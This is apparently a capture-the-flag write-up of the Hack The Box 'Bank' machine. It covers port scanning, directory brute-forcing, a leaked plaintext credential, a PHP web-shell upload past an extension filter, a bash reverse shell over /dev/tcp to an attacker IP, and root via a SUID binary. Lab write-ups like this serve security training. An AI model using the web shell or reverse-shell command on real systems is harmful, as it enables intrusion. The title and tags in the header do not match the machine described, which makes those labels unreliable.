---
layout: single
title: Lame - Hack The Box
excerpt: "Bank is a relatively simple machine, however proper web enumeration is key to finding the
necessary data for entry. There also exists an unintended entry method, which many users find
before the correct data is located."
date: 2022-05-21
classes: wide
header:
  teaser: /assets/images/htb-writeup-bank/bank_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---
![](/assets/images/htb-writeup-bank/bank_logo_png)
---

SYNOPSIS
Bank is a relatively simple machine, however proper web enumeration is key to finding the
necessary data for entry. There also exists an unintended entry method, which many users find
before the correct data is located.


**Skills Required**
- Basic knowledge of Linux
- Enumerating ports and services

**Skills Learned**
- Identifying vulnerable services
- Exploiting SUID files

# Reconnaissance
First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

masscan

```bash
masscan -p0-65535,U:0-65535 --rate=500 -e tun0 10.129.119.4
```

```bash
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-20 19:50:18 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 53/udp on 10.129.119.4                                    
Discovered open port 80/tcp on 10.129.119.4                                    
Discovered open port 22/tcp on 10.129.119.4                                    
Discovered open port 53/tcp on 10.129.119.4  
```

Nmap

```bash
nmap -p- -sS --min-rate 5000 --open -T5 -vvv -n -Pn -oG allPorts 10.129.119.4
```

```bash
# Nmap 7.92 scan initiated Tue May 17 16:39:08 2022 as: nmap -p- -sS --min-rate 5000 --open -T5 -vvv -n -Pn -oG allPorts 10.129.119.4
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.129.119.4 ()	Status: Up
Host: 10.129.119.4 ()	Ports: 22/open/tcp//ssh///, 53/open/tcp//domain///, 80/open/tcp//http///
# Nmap done at Tue May 17 16:39:24 2022 -- 1 IP address (1 host up) scanned in 16.11 seconds
```

- IP Address: 10.129.119.4
- Open ports: 22,53,80

```bash
nmap -sCV -p22,53,80 -oN targeted 10.129.119.4
```

```bash
# Nmap 7.92 scan initiated Tue May 17 16:52:57 2022 as: nmap -sCV -p22,53,80 -oN targeted 10.129.119.4
Nmap scan report for 10.129.117.216
Host is up (0.51s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May 17 16:53:16 2022 -- 1 IP address (1 host up) scanned in 18.78 seconds
```

Nmap reveals **OpenSSH**, a **DNS** server and an **Apache server**. Apache is running the default web
page, and no information can be gained from the **DNS server**. In this case, Apache is using a
virtual host to route traffic. The hostname must be guessed on this machine (**bank.htb**) and then
added to* /etc/hosts*. The site first presents a login page, however it is not vulnerable.

# Enumeration

**Scan for Virtual Hosts**
I did a quick scan for virtual hosts using `wfuzz`
```bash
wfuzz -u http://10.129.119.4/ -H "Host: FUZZ.bank.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hh 11510
```
It didn’t find anything

**Directory Brute Force**

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://bank.htb/FUZZ
```

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://bank.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                       
=====================================================================

000000003:   302        188 L    319 W      7322 Ch     "# Copyright 2007 James Fisher"                                               
000000001:   302        188 L    319 W      7322 Ch     "# directory-list-2.3-medium.txt"                                             
000000007:   302        188 L    319 W      7322 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"             
000000291:   301        9 L      28 W       304 Ch      "assets"                                                                     
000000014:   302        188 L    319 W      7322 Ch     "http://bank.htb/"                                                           
000000013:   302        188 L    319 W      7322 Ch     "#"                                                                           
000000012:   302        188 L    319 W      7322 Ch     "# on at least 2 different hosts"                                             
000000011:   302        188 L    319 W      7322 Ch     "# Priority ordered case-sensitive list, where entries were found"           
000000010:   302        188 L    319 W      7322 Ch     "#"                                                                           
000000009:   302        188 L    319 W      7322 Ch     "# Suite 300, San Francisco, California, 94105, USA."                         
000000006:   302        188 L    319 W      7322 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"               
000000008:   302        188 L    319 W      7322 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                 
000000005:   302        188 L    319 W      7322 Ch     "# This work is licensed under the Creative Commons"                         
000000002:   302        188 L    319 W      7322 Ch     "#"                                                                           
000000004:   302        188 L    319 W      7322 Ch     "#"                                                                           
000000164:   301        9 L      28 W       305 Ch      "uploads"                                                                     
000002190:   301        9 L      28 W       301 Ch      "inc" 
000045240:   302        188 L    319 W      7322 Ch     "http://bank.htb/"
000095524:   403        10 L     30 W       288 Ch      "server-status"
000192709:   301        9 L      28 W       314 Ch      "balance-transfer"  
```

I went inot curl to see how the site worked, and I noticed something weird - the 305,302 redirect on the root was pretty big in size:

```bash
curl -s -X GET "http://bank.htb/uploads" -L
```
```bash
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /uploads/
on this server.</p>
<hr>
<address>Apache/2.4.7 (Ubuntu) Server at bank.htb Port 80</address>
</body></html>
```

Let's go to folder *blance-transfer*

provided a directory list with a lot of .acc files, each of which is 32 hex characters (MD5?):

```bash
echo -n "fc73548dc690c238c5aff9cb9e440498" | wc -c
```
```bsah
32
```
```bash
curl -s http://bank.htb/balance-transfer/ | grep -F '.acc' | wc -l
```
I can grep on .acc to get just the table rows showing files (-F so that . is an actual period and not a wildcard for any character). There are 999 files:

```bash
curl -s -X GET "http://bank.htb/balance-transfer/" | grep -oP '[a-x0-9]{32}\.acc.*"right".+\s' | awk '{print $1 " -> " $7}' FS=">" | tr -d '"' | sort -k3 -n | head -n 10
```
257 is a much smaller size. If I look at all the sizes in a histogram, I can see all of the other files are between 581 and 585 bytes:
```bash
68576f20e9732f1b2edc4df5b8533230.acc -> 257 
09ed7588d1cd47ffca297cc7dac22c52.acc -> 581 
941e55bed0cb8052e7015e7133a5b9c7.acc -> 581 
052a101eac01ccbf5120996cdc60e76d.acc -> 582 
0d64f03e84187359907569a43c83bddc.acc -> 582 
10805eead8596309e32a6bfe102f7b2c.acc -> 582 
20fd5f9690efca3dc465097376b31dd6.acc -> 582 
346bf50f208571cd9d4c4ec7f8d0b4df.acc -> 582 
70b43acf0a3e285c423ee9267acaebb2.acc -> 582 
780a84585b62356360a9495d9ff3a485.acc -> 582
```
I’ll open that file, and it seems the encryption failed:
```bash
curl -s -X GET "http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc"
```
```bash
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```
That leaves a plaintext email and password.

**Login**

Now I can login as chris:

**Exploitation**
support.php presents a form and open tickets:
Upload Filter Enumeration

```php
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

I’ll want the extension to be .php so that it’ll be executed by the server. However, when I try to submit the ticket, it is rejected:
My first test was to change the extension to .png and resend. Unfortunately, success:

```html
<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] --
```

I changed the upload to cmd.htb, and it uploaded.
To test, I ran the id command, and it worked:
```bash
curl http://bank.htb/uploads/cmd.htb?cmd=id
```
```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now to get a shell, with nc listening on 443, I’ll issue the following command to the webshell:

```bash
curl http://bank.htb/uploads/cmd.htb?cmd=bash -c "bash -i>%26 /dev/tcp/10.10.14.99/443 0>%261"
```

The connection comes back with a shell:
```bash
nc -lnvp 443
```
```bash
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.14.99.
Ncat: Connection from 10.10.14.99:53542.
bash: cannot set terminal process group (1076): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bank:/var/www/bank/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
We’ll need to escalate privileges

# Escalate Privileges

```bash
find / -type f -user root -perm -4000 2>/dev/null
```
```bash
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
```

The first one is particularly interesting and non-standard, `/var/htb/bin/emergency`.
Running emergency just returns a root shell
```bash
www-data@bank:/$ /var/htb/bin/emergency                           
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```
